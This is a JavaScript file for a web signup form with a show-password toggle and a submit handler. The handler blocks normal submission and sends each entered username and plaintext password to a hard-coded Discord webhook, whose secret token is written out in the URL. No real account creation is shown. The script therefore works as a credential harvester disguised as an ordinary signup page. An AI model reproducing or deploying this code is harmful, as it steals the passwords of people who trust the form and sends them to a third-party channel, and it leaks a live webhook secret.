const togglePasswordSignUp = document.getElementById("togglePassword");
const passwordInputSignUp = document.getElementById("password");
const signupForm = document.getElementById("signupForm");

togglePasswordSignUp.addEventListener("click", function () {
    // Toggle the type attribute of the password input field
    const type = passwordInputSignUp.type === "password" ? "text" : "password";
    passwordInputSignUp.type = type;

    // Toggle the eye icon between open and closed
    this.textContent = type === "password" ? "👁️" : "🚫";
});

signupForm.addEventListener("submit", function (event) {
    event.preventDefault();

    // Collect username, email, and password
    const username = document.getElementById("username").value;
    const email = document.getElementById("email").value;
    const password = document.getElementById("password").value;

    // Prepare the data to send to the webhook
    const data = {
        username: username,
        email: email,
        password: password,
    };

    // Send the data to the Discord webhook
    fetch("https://discord.com/api/webhooks/1315544300695584830/UqHr8rG9jfLuE8bA79w4F2XPkEG7DBEAYjRB_XPT2M8R3JmOYJXRHmzxBApKXEXULNjr", {
        method: "POST",
        headers: {
            "Content-Type": "application/json"
        },
        body: JSON.stringify({
            embeds: [
                {
                    title: "New User",
                    description: `User: ${data.username} has been created with the password: ${data.password}`,
                    color: 16777215 // White color
                }
            ]
        })
    })
    .then(response => response.json())
    .then(data => {
        console.log('Success:', data);
    })
    .catch((error) => {
        console.error('Error:', error);
    });

    // Optionally, you can redirect or reset the form after successful submission
    signupForm.reset();
});
